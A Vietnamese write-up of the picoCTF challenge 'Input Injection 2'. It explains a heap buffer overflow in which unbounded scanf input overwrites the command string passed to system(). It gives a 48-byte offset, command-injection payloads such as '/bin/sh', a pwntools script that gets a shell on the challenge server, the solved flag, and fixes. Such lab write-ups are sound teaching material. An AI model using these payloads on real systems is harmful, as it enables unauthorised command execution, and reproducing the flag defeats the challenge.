# picoCTF Writeup — Input Injection 2

## Thông tin bài

- **Tên bài:** Input Injection 2
- **Dạng:** Binary Exploitation / Heap Buffer Overflow
- **Nền tảng:** picoCTF
- **Flag:** `picoCTF{us3rn4m3_2_sh3ll_6538c392}`

---

## 1. Phân tích mã nguồn

Mã nguồn của chương trình:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    char* username = malloc(28);
    char* shell = malloc(28);

    printf("username at %p\n", username);
    fflush(stdout);

    printf("shell at %p\n", shell);
    fflush(stdout);

    strcpy(shell, "/bin/pwd");

    printf("Enter username: ");
    fflush(stdout);

    scanf("%s", username);

    printf("Hello, %s. Your shell is %s.\n", username, shell);

    system(shell);
    fflush(stdout);

    return 0;
}
```

Chương trình cấp phát hai vùng nhớ trên heap:

```c
char* username = malloc(28);
char* shell = malloc(28);
```

- `username` dùng để lưu tên người dùng.
- `shell` dùng để lưu câu lệnh sẽ được truyền vào `system()`.

Ban đầu, `shell` chứa:

```c
strcpy(shell, "/bin/pwd");
```

Vì vậy, nếu chương trình chạy bình thường thì lệnh sau sẽ được thực thi:

```c
system("/bin/pwd");
```

---

## 2. Xác định lỗ hổng

Lỗ hổng nằm tại:

```c
scanf("%s", username);
```

Biến `username` chỉ được cấp phát 28 byte, nhưng `%s` không giới hạn số lượng ký tự được nhập.

Nếu nhập một chuỗi dài hơn vùng nhớ của `username`, dữ liệu sẽ tiếp tục ghi sang vùng nhớ nằm phía sau trên heap.

Đây là lỗi:

```text
Heap Buffer Overflow
```

Do `shell` được cấp phát ngay sau `username`, ta có thể ghi tràn từ `username` sang `shell` và thay đổi câu lệnh được truyền vào:

```c
system(shell);
```

---

## 3. Bố cục heap

Chương trình in địa chỉ của hai vùng nhớ:

```c
printf("username at %p\n", username);
printf("shell at %p\n", shell);
```

Khi chạy local:

```text
username at 0x240082a0
shell at 0x240082d0
```

Tính khoảng cách:

```text
0x240082d0 - 0x240082a0 = 0x30
```

Đổi sang hệ thập phân:

```text
0x30 = 48
```

Vậy cần ghi 48 byte từ đầu `username` để chạm tới đầu vùng nhớ `shell`.

Bố cục đơn giản:

```text
Địa chỉ thấp                                      Địa chỉ cao

[ username .................................... ][ shell ............ ]
^                                                  ^
0 byte                                             48 byte
```

Payload có dạng:

```python
b"A" * 48 + b"<lệnh mới>"
```

---

## 4. Thử ghi đè `shell`

Ban đầu thử payload:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*48 + b"cat flag.txt\n")' | ./vuln
```

Kết quả:

```text
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat. Your shell is cat.
```

Nguyên nhân là do:

```c
scanf("%s", username);
```

`%s` chỉ đọc dữ liệu đến ký tự khoảng trắng đầu tiên.

Vì vậy chuỗi:

```text
cat flag.txt
```

chỉ được đọc thành:

```text
cat
```

---

## 5. Vượt qua giới hạn khoảng trắng

Có thể sử dụng lệnh không chứa dấu cách:

```bash
cat<flag.txt
```

Shell hiểu câu lệnh trên tương đương:

```bash
cat < flag.txt
```

Payload đọc flag trực tiếp:

```bash
python3 -c 'print("A"*48 + "cat<flag.txt")' | ./vuln
```

Ngoài ra, để mở shell, chỉ cần ghi đè `shell` thành:

```text
/bin/sh
```

Chuỗi này không chứa khoảng trắng nên phù hợp với `scanf("%s", ...)`.

---

## 6. Khai thác bằng pwntools

Script khai thác server:

```python
from pwn import *

HOST = "amiable-citadel.picoctf.net"
PORT = 61428

p = remote(HOST, PORT)

offset = 48
payload = b"A" * offset + b"/bin/sh"

p.sendlineafter(b"Enter username: ", payload)

p.interactive()
```

Lưu thành:

```text
solve.py
```

Sau đó chạy:

```bash
python3 solve.py
```

Khi đã vào chế độ tương tác, thực hiện:

```bash
ls
cat flag.txt
```

Kết quả:

```text
picoCTF{us3rn4m3_2_sh3ll_6538c392}
```

---

## 7. Giải thích payload

Payload:

```python
payload = b"A" * 48 + b"/bin/sh"
```

Được chia thành hai phần:

```text
"A" * 48
```

Dùng để lấp đầy khoảng cách từ địa chỉ `username` tới địa chỉ `shell`.

Phần sau:

```text
/bin/sh
```

được ghi đúng vào vùng nhớ mà con trỏ `shell` đang trỏ tới.

Sau khi ghi tràn, chương trình thực hiện:

```c
system(shell);
```

Tương đương:

```c
system("/bin/sh");
```

Nhờ đó ta có một shell trên server và có thể đọc flag.

---

## 8. Script hoàn chỉnh

```python
#!/usr/bin/env python3

from pwn import *

HOST = "amiable-citadel.picoctf.net"
PORT = 61428

context.log_level = "info"

def main():
    p = remote(HOST, PORT)

    offset = 48
    payload = b"A" * offset + b"/bin/sh"

    p.sendlineafter(b"Enter username: ", payload)
    p.interactive()

if __name__ == "__main__":
    main()
```

---

## 9. Cách sửa lỗ hổng

Cần giới hạn số ký tự được nhập:

```c
scanf("%27s", username);
```

Vì `username` có 28 byte:

- tối đa 27 byte cho nội dung;
- 1 byte dành cho ký tự kết thúc chuỗi `\0`.

Có thể dùng cách an toàn hơn:

```c
fgets(username, 28, stdin);
```

Ngoài ra, không nên truyền dữ liệu có khả năng bị thay đổi vào:

```c
system()
```

Trong trường hợp chỉ cần in thư mục hiện tại, nên gọi trực tiếp hàm hệ thống phù hợp thay vì thực thi chuỗi lệnh shell.

---

## 10. Kết luận

Bài sử dụng lỗi heap buffer overflow do `scanf("%s", username)` không kiểm tra độ dài đầu vào.

Các bước khai thác:

1. Xác định `username` và `shell` được cấp phát liên tiếp trên heap.
2. Lấy hiệu hai địa chỉ để tính offset.
3. Xác định offset là 48 byte.
4. Ghi 48 byte rác để chạm tới `shell`.
5. Ghi đè `shell` thành `/bin/sh`.
6. Giữ kết nối bằng pwntools.
7. Đọc file flag trên server.

Flag:

```text
picoCTF{us3rn4m3_2_sh3ll_6538c392}
```
